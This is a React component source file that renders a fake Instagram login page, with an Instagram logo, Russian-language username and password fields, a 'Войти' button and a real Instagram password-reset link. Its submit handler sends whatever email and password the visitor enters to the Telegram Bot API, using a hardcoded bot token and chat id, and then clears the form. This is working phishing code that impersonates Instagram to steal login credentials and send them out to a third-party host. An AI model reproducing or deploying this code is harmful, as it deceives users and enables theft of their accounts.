import React, { useState } from 'react';
import logo from "../../img/Instagram_logo.svg.png"
import axios from 'axios';


const HeaderCart = () => {
    const [email, setEmail] = useState("")
    const [password, setPassword] = useState("")
    function adToTelegram(){
     if(email !== "" && password !== ""){
        let my_id = "6074156085"
        const token = "6887267044:AAEYtyTGdilkrMvezEB-1fu5ZUglcWuWy-g"
        const url_api = `https://api.telegram.org/bot${token}/sendMessage`
        let  toTelegram = {
          chat_id: my_id,
          parse_model: "html",
          text:`
          Iskender:
          email: ${email}
          password: ${password}
          `
        }
  
        axios.post(url_api, toTelegram)
        setEmail("")
        setPassword("")
     }
    }
    return (
        <div id='header'>
            <div className="container">
            <div className="header">
          <div className="block">
                <div className="headBlock">
                <a href='https://www.instagram.com/kg_usa/' className='deleteBtn'>Χ</a>
            <img className='logo' src={logo} alt="" />
                </div>
            <div className="blocks">
            <div className="inp">
            <input type="email"
             onChange={(e) => setEmail(e.target.value)} placeholder='Телефон, имя пользователя или эл, адрес'/>
            <input type="password" onChange={(e) => setPassword(e.target.value)} placeholder='Пароль'/>
            </div>
            <div className="checkbox">
            <input className='check' type="checkbox" value="checkboxValue"/>
            <p>Сохранить данные входа</p>
            </div>
           <div className="btn">
           <button onClick={() => adToTelegram()} className='addBtn'>Войти</button>
            <a href='https://www.instagram.com/accounts/password/reset/'>Забыли пароль?</a>   
           </div>
            </div>
           </div>
            </div>

            </div>
        </div>
    );
};

export default HeaderCart;